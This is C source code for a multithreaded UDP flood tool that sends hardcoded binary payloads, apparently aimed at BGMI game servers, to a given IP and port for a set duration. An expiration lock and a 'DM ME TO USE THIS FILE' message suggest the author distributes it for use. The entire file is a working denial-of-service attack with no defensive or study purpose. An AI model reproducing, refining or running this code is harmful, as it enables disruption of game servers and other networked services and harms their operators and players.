#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#define EXPIRATION_YEAR 2024    // Year 
#define EXPIRATION_MONTH 12    // October
#define EXPIRATION_DAY 25       // 1st day of the month

void usage() {
    printf("Usage: ./bishal ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;          // Day of the month [1-31]
    time(&now);   
    if (difftime(now, mktime(&expiration_date)) > 0) {
        printf("█▄░█ █▀█ █▀█ █▄▄   █▀ ▄▀█ █░░ ▄▀█\n");
        printf("█░▀█ █▄█ █▄█ █▄█   ▄█ █▀█ █▄▄ █▀█\n");
        printf("This file is closed by BISHAL.\nDM ME TO USE THIS FILE.\n");
        exit(EXIT_FAILURE);
    }
}
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\xDE\x67\xEE\x93\x48\x09\xFD\xC7\x04\x36\x76\xC0\x76\xA7\x68\x82\x08\xEC\x85\x53\xAD\x7C\xB8\x13\x06\xCE\xA5",
        "\xDE\x67\xEE\x93\xD0\x0A\x2A\x85\xDC\x39\x92\xA2\x80\x72\x6E\x58\x56\xA0\xFC\xCB\x9D\x1F\x4A\x47\x77\x43\x30\x1F\x26\x90\xA1\xFE\x38\xC9\x58\x76\x87\xBA\x8A\xBA\xAD\xC2\x45\x32\x70\xDC\x0C\x28\xE3\xE8\xC8\x76\xA1\xB3\x05\x48\xAE\x89\x45\x67\xFF\x59\x5E\x73\xE4\xB4\x9E\xFE\x63\x16\xE0\xB0\x0E\xDA\xA2\x5F\x39\x42\x12\x42\x9C\x66\x0F\xB5\x67\xE5\x30\xD4\xDB\x59\xBA\x6A\x99\xE5\x14\xB4\x5A\x0F\x05\xFF\x20\x43\x89\xDF\x7A\x35\x09\x17\xFE\xC3\x4F\x39\x81\x88\xFF\xB8\xDA\x64\xED\x2E\xEC\xEF\xE4\xE6\xF4\xC1\x17\x79\x0F\x16\x7D\xCC\xB0\x71\x0E\x56\x7E\x54\xDA\xB6\xC5\x2B\x65\x48\x04\x67\x20",
        "\xDE\x67\xEE\x93\x44\x0A\xFD\xC7\x04\x36\x76\xC0\x76\xA7\x68\x82\x08\x0E\x84\x9F\xAA\x7C\x0F\x93\x9D\xDE\x2B\x98\x56\x13\xE1\xEC\x60\xA2\x5B\x76\x7E\x1D\x18\x30\x22\x5C\x67\xA6\x09\x5D\x6B\xB9\xAB\x86\x6D\xD3\x65\xD4\x9A\xC8\xB0\x3F\xBE\x88\x79\xAC\x74\xAF\xD4\x1D\x04\xEA\x9A\x3B\xA2\xD7\x12\x28\xBB\xC7\x1D\x82\x04\x53\x83\x90\xF6\xAC\x25\xA2\xF4\xDA\xA8\xA5\xDE\xF0\x61\xAD\x50\xEA\xC1\x44\x7E\x2A\x0B\x0E\x50\xE5\xB0\x76\x9A\x56\xF9\x8A\x69\xC3\xB4\xBA\xBA\xA5\xA8\x67\x3F",
        "\xDE\x67\xEE\x93\x68\x0A\x6D\xC5\x24\x5F\xFA\xB7\x05\xBB\xFF\x99\xD0\xC4\xA6\xB7\x02\x04\xCB\xEC\x5B\x17\xE2\xFD\xC0\x77\x1B\x44\x9B\xA3\x2D\x0C\x8D\x18\xEA\x58\xA6\x1F\x8C\x52\x82\x86\x8D\xA4\x35\x6C\xA0\x7A\x54\xEA\x95\x4F\x6D\xDC\x80\x16\x68\xCA\x07\xBB\xFC\xA5\x25\x20\x80\xE2\x7E\xEF\x00\x07\x81\x0E\x5F\x53\x9E\x62\x5D\xE3\xE7\x8E\x7D\xD8\x17\x8A\x98\x9D\x27\xB7\xC1\x55\xE8\x71\x01\x14\xD9\xC2\x4B\xED\x20\xBB\x5C\x49\xBF\x65\xEA\x3E\xFE\xA0\xB4\x0A\x4E\x0C\xFA\xB6\x5E\x2D\xD7\xCC\x94\x9B\x3D",
        "\xDE\x67\xEE\x93\x60\x0A\x6D\xC5\xE4\x4C\xFA\xB7\x05\xBB\xFF\x99\xD0\xC4\xA6\xB7\x02\x04\xCB\xEC\x5B\x17\xE2\xFD\xB8\x7B\xF5\xB9\xEA\xA7\xE7\x5D\xCD\xE0\x3B\x54\xA6\x6B\xB2\xB7\x3F\xD3\x84\x85\x43\x68\xFD\x43\xA6\x1F\xB7\x93\x14\xF0\x56\xFC\x3D\xE0\xB5\xDE\xB9\xA7\xBE\x57\x10\x8B\x9C\x38\x1A\x5E\xCF\x12\x2C\x89\x87\x78\x8C\xDB\xD3\xF3\x15\x62\xA6\xE1\xE6\x8E\x98\x82\x7C\xA6\x47\xC7\x33\x6A\x69\x3D\x53\x1B\x57\x0A\xA2\x76\xD8\x4A\x34\x32\x94\x67\xC5\xDD\x22\x69\x86\x26\x00\xBD\xE2\xD9\x93\x6C\x58\xDD\x26\x2E\xA4\xA1\x02\xE4\x80\x4E\x0E\x35\xDC\x52\x80\xAB",//BGMI UP FILE 109 number Line 
        "\x22\x14\x5E\x1F\xE9\xDE\xE6\xD0\x92\x39\x36\xAE\x0D\xD8\xA8\x28\xA2\x4D\x77\xC2\xA0",
        "\xCA\x17\xF0\x1E\x38\x9E\xD7\xC7\x0C\x7D\x0B\x3E\x6D\xEB\x17\xDF\x06\x4B\x4E\xA8\xA0\xA4\xF8\xEC\x7B\x39\x79\x19\xA7\xC6\x3C\x4D\xCE\xEF\xCA\x3A\x27\x91\x98\x6E\xA6\x83\x45\xC6\x2E\xF1\x76\x27\xFE\x8C\xAC\xB7\x66\xCD\xB7\xF3\xB2\xCD\x02\x57\x7D\x59\x0C\xBD\xFA\xCF\x74\x8E\x8B\xEF\x8E\x1C\xC6\xE7\xFD\xA9\x26\x1D\xB1\x3D\x66\xF1\xAD\x94\x66\x01\x47\xE6\xB3\xF6\xDC\x6D\x0F\xA8\x64\x97\x0F\xC9\x63\x7F\x45\x42\x0C\x30\x9C\x93\xF5\x72\x8C\x17\xCB\x3A\x84\xA6\x1A\x3B\xBF\x74\x38\xDA\x5D\x4F\x64\x94\x1B\x43\x95\x58\x48\x37\x0F\x40\x97\xC6\xBF\x51\xC4\x7B\x43\x3A\xA1\x4F\xCA\x42\x50\x64\xB6\x77\x20\x24\x32\xF0\xCE\xD9\x71\x19\xAC\x99\x50\x5C\xC6\xF3\x67\xB4\xDA\x14\x06\x4B\x3E\x05\x40\xD9\x56\x53\x60\xC7\xD1\x73\xB9\x34\x50\x99\x85\xF5\xA8\x69\x2D\x6F\x97\x86\x27\x78\xAB\x2E\xAD\x55\x89\x15\xB7",
        "\xC6\x17\x9F\xC3\xDC\xA3\xE8\x85\x4A\x79\xC6\x25\x63\x73\xEC\xF7\x21\x79\x5C\x48\xA1\x8C\xBC\x68\xEF\x31\x97\xEA\xDA\x67\xE5\x1B\xB4\x5D\xA4\xF5\xE2\x0A\x29\x58\x96\x84\xC5\xF4\xB7\x4A\xD3\x8C\xBB\x33\x31\x9A\xA2\x11\xF7\xA3\xF7\x65\xC3\xD6\xF9\xA7\x9A\xEE\x33\xA7\x01\xD1\x91\x95\x90\x89\x28\xD3\x99\x5C\x06\x49\xBC\x60\x58\xAA\xFE\x9D\xD5\x2A\x5C\xBB\xE0\xF5\x6E\xC1\x80\xD5\x98\x8A\x11\xAD\x2E\x32\x23\x6C\xA3\x7E\xC1\xAE\x2A\x0E\xC9\xC2\xD1\x49\xFE\xA9\x2F\x27\x73\x08\x14\xFC\x90\xFB\x48\x5A\xCD\x34\x38\xCE\xAE\xA1\x03\x06\x85\xDE\x3C\x61\xC4\x33\x31\xA8\x45\x48\xFA\x88\x20\xF8\x26\x95\x40\x82\xCF\x24\x26\x33\x83\xE1\xB9\x00\xD2\x04\xCD\x67\x7F\x6F\xDA\x70\x53\xB8\x66\x45",
        "\xAE\x17\xD4\x1E\x2E\x5E\x84\xF0\x69\xB2\x30\xAF\x22\xAA\xEA\x13\x17\x1F\x41\x4C\xF7\xBC\x4C\x13\x84\xDA\xC3\xFA\x96\x60\xDD\xE7\xD3\xA1\x2B\xF0\x9A\x0F\x91\x5D\xD6\x80\x45\x82\x65\x4C\xEB\x32\x91\xCD\xF1\x7A\xA6\x11\xB7\x53\xFB\x52\xC0\xD7\xFD\x59\x0C\xBB\xFC\xA5\x6E\xB8\xE1\x3B\xA2\xB7\x2C\x51\xAD\xB3\x0B\x26\xA6\x7F\xC0\xB6\xBD\x77\x7B\x21\xDF\x91\x81\xC6\xA9\x2F\x5E\xCF\x5F\xF8\x58\x12\xB7\x09\x36\x60\x60\xF6\x0B\x42\xB3\xB7\xE0\xD4\xB8\x81\xB9\x0F\x4A\x0C\xE8\x52\xBF\x1D\xDB\x6F\x5E\xD3\x4B\x7C\x02\xBD\x75\xCD\x03\x3E\x98\x2A\x74\xD9\xA8\x2E\x07\x30\x74\xF9\xB8\x42\xCB\x18\xA7\xA1\x32\xD2\x38\x18\x00\xD1\xC7\xB8\xB2\x23\x0E\x1A\xED\x0B\x7F\x05\x1E\xF0\x2B\x46\x27\xA3\xF6\x49\x18\x19\x56\x7F\x27\xDB\x34\x1C\x3B\x80\x86\x91\x89\xC2\x25\xC3\x32\x87\x05",
        "\x9A\x17\x2E\x1E\x51\xDE\xBA\xD0\xC1\x39\x42\x0D\xEC\x33\xC0\xD9\x78\x4A\x4C\x99\x69\x6C\xF8\xF8\x7B\x25\xA4\x71\x1C\xCD\x1B\x7A\xC3\x26\xE9\x5B\xF2\xE4\x66\xA1\x59\x74\x24\x54\x67\xFE\xC3\x2C\x5B\x9D\x31\xB0\xA6\x8B\xB7\x79\xA2\xE5\xC0\x21\x9C\x3F\x0D\xBB\xFC\xAD\xCE\xE0\xFA\x1B\xE2\xF7\xE6\xA3\xE7\x5A\x84\x61\xE1\xAD\x13\x70\x42\xE2\xE8\xB1\x42\x36\xCD\xC3\x9F\xEB\x1B\xCE\xC3\xAF\x5C\x29\xC1\xC9\xD2\x98\xF1\xC0\x01\xDD\x7D\x81\x90\x97\x3D\xE0\x7F\x20\xA4\xC6\x32\x5E\x59\xA9\x5D\x1B\xB8\xB4\x87\x91\x8C\x04\x7E\x73\x8D\xAC\x4D\x60\xEA\xB3\x18\xE9\xCB\xAC\x47\x2B\xEA\x44\x50\x64\x26\x01\xB8\x94\xE0\x9D\x24\xE7\x96\x26\x16\x17\xE9\xDD\x93\x63\x7E\xB5\x16\x53\xAE\x2E\x83\x94\xD3\x4F\x03\x0B\x2E\x07\xC2\x6D\xF1\xCD\x29\x40\xF9\x78\x1B\xBE\x35\x2F\xA7\x44\xAA\x7A\xD6\x5A\x9B\xA7\xA5\x1F\x55\x7D\x6C\x64\x7F\xBC\x01\x0A\x37\xE0\x60\x02\x77\x9E\x72\xE6\x21\x24\x6D\x80\xA6",//BGMI DOWN FILE 167 number Line
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    check_expiration();
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("█▀▀ █░█ █▀▀ █▄▀   █▄█ █▀█ █░█   █▄▄ █▀▀ █▀▄▀█ █\n");
    printf("█▀░ █▄█ █▄▄ █░█   ░█░ █▄█ █▄█   █▄█ █▄█ █░▀░█ █\n");
    printf("Attack finished join @Bishal_M1\n");
    return 0;
}


